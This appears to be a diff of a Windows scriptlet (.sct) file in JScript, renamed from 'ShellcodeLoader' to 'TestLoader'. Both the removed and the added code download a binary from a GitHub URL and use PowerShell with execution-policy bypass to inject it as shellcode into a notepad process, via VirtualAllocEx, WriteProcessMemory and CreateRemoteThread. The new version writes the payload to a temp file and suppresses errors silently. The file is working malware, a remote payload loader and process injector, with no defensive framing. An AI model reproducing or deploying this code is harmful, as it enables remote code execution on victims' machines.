@@ -1,75 +1,59 @@
 <?XML version="1.0"?>
 <scriptlet>
 <registration
-    description="ShellcodeLoader"
-    progid="ShellcodeLoader"
+    description="TestLoader"
+    progid="TestLoader"
     version="1.00"
-    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}">
+    classid="{12345678-1234-1234-1234-123456789ABC}">
     
     <script language="JScript">
         <![CDATA[
-            var url = "https://github.com/xekze0102-art/b64a/raw/refs/heads/main/loader.bin";
-            var xhr = new ActiveXObject("MSXML2.XMLHTTP");
-            xhr.open("GET", url, false);
-            xhr.send();
-            
-            if (xhr.status == 200) {
-                var payload = xhr.responseBody;
-                var shellcode = new VBArray(payload).toArray();
+            try {
+                var xhr = new ActiveXObject("MSXML2.XMLHTTP");
+                xhr.open("GET", "https://github.com/xekze0102-art/b64a/raw/refs/heads/main/loader.bin", false);
+                xhr.send();
                 
-                var shell = new ActiveXObject("WScript.Shell");
-                var psCode = "";
-                psCode += "$code = [System.Convert]::FromBase64String('" + base64Encode(shellcode) + "');";
-                psCode += "Add-Type -TypeDefinition @'";
-                psCode += "using System;";
-                psCode += "using System.Runtime.InteropServices;";
-                psCode += "using System.Diagnostics;";
-                psCode += "public class Inject {";
-                psCode += "[DllImport(\"kernel32.dll\")]";
-                psCode += "public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);";
-                psCode += "[DllImport(\"kernel32.dll\")]";
-                psCode += "public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);";
-                psCode += "[DllImport(\"kernel32.dll\")]";
-                psCode += "public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);";
-                psCode += "[DllImport(\"kernel32.dll\")]";
-                psCode += "public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);";
-                psCode += "[DllImport(\"kernel32.dll\")]";
-                psCode += "public static extern bool CloseHandle(IntPtr hObject);";
-                psCode += "public static void InjectShellcode(byte[] shellcode) {";
-                psCode += "Process notepad = new Process();";
-                psCode += "notepad.StartInfo.FileName = \"notepad.exe\";";
-                psCode += "notepad.Start();";
-                psCode += "notepad.WaitForInputIdle(3000);";
-                psCode += "IntPtr hProcess = OpenProcess(0x1F0FFF, false, notepad.Id);";
-                psCode += "IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);";
-                psCode += "UIntPtr bytesWritten;";
-                psCode += "WriteProcessMemory(hProcess, addr, shellcode, (uint)shellcode.Length, out bytesWritten);";
-                psCode += "CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);";
-                psCode += "CloseHandle(hProcess);";
-                psCode += "}";
-                psCode += "}";
-                psCode += "'@;";
-                psCode += "[Inject]::InjectShellcode($code);";
-                
-                shell.Run("powershell -exec bypass -Command \"" + psCode + "\"", 1, true);
-            }
-            
-            function base64Encode(data) {
-                var base64 = "";
-                var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-                for (var i = 0; i < data.length; i += 3) {
-                    var a = data[i] || 0;
-                    var b = data[i + 1] || 0;
-                    var c = data[i + 2] || 0;
-                    var bits = (a << 16) | (b << 8) | c;
-                    base64 += chars.charAt((bits >> 18) & 63);
-                    base64 += chars.charAt((bits >> 12) & 63);
-                    base64 += chars.charAt((bits >> 6) & 63);
-                    base64 += chars.charAt(bits & 63);
+                if (xhr.status == 200) {
+                    var shell = new ActiveXObject("WScript.Shell");
+                    var tempFile = "C:\\Windows\\Temp\\loader.bin";
+                    
+                    var stream = new ActiveXObject("ADODB.Stream");
+                    stream.Open();
+                    stream.Type = 1;
+                    stream.Write(xhr.responseBody);
+                    stream.SaveToFile(tempFile, 2);
+                    stream.Close();
+                    
+                    shell.Run("notepad.exe", 1, true);
+                    
+                    var psCommand = 
+                        "$code = [System.IO.File]::ReadAllBytes('" + tempFile + "'); " +
+                        "Add-Type -TypeDefinition @' " +
+                        "using System; using System.Runtime.InteropServices; using System.Diagnostics; " +
+                        "public class Inject { " +
+                        "[DllImport(\"kernel32.dll\")] " +
+                        "public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId); " +
+                        "[DllImport(\"kernel32.dll\")] " +
+                        "public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); " +
+                        "[DllImport(\"kernel32.dll\")] " +
+                        "public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten); " +
+                        "[DllImport(\"kernel32.dll\")] " +
+                        "public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); " +
+                        "public static void Execute(byte[] shellcode) { " +
+                        "var procs = Process.GetProcessesByName(\"notepad\"); " +
+                        "if (procs.Length > 0) { " +
+                        "IntPtr hProcess = OpenProcess(0x1F0FFF, false, procs[0].Id); " +
+                        "IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40); " +
+                        "UIntPtr bytesWritten; " +
+                        "WriteProcessMemory(hProcess, addr, shellcode, (uint)shellcode.Length, out bytesWritten); " +
+                        "CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero); " +
+                        "}} '@; " +
+                        "[Inject]::Execute($code);";
+                    
+                    shell.Run("powershell -exec bypass -Command \"" + psCommand + "\"", 1, true);
                 }
-                if (data.length % 3 === 1) base64 = base64.slice(0, -2) + "==";
-                else if (data.length % 3 === 2) base64 = base64.slice(0, -1) + "=";
-                return base64;
+            } catch(e) {
+                // Continue silently
             }
         ]]>
     </script>
